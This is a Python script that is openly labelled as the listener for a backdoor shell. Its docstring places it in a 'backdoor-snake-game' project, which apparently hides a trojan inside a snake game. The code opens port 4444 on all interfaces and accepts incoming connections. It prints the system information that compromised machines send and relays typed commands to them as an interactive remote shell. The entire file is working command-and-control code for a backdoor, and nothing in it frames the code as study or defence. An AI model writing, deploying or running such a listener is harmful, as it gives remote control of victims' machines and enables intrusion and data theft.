#!/usr/bin/env python3
"""
Listener for backdoor shell
Place in: backdoor-snake-game/listener/listener.py
Run: python listener.py
"""

import socket
import sys
import threading
import time

def handle_client(conn, addr):
    """Handle incoming shell connection"""
    print(f"\n[+] Connection from {addr}")
    print("[+] Interactive shell opened. Type 'exit' to close.\n")
    
    # Receive initial system info
    try:
        initial_info = conn.recv(4096).decode('utf-8', errors='ignore')
        print(initial_info)
    except:
        pass
    
    try:
        while True:
            # Get command
            cmd = input("shell> ")
            
            if not cmd:
                continue
            
            # Send command
            conn.send(cmd.encode('utf-8'))
            
            if cmd.lower() == 'exit':
                break
            
            # Receive output
            output = conn.recv(4096).decode('utf-8', errors='ignore')
            print(output)
    
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        conn.close()
        print(f"[+] Connection with {addr} closed")

def start_listener(host="0.0.0.0", port=4444):
    """Start listening for connections"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(5)
        print(f"[*] Listening on {host}:{port}")
        print("[*] Waiting for connections...")
        
        while True:
            conn, addr = server.accept()
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.daemon = True
            client_thread.start()
    
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        server.close()

if __name__ == "__main__":
    start_listener()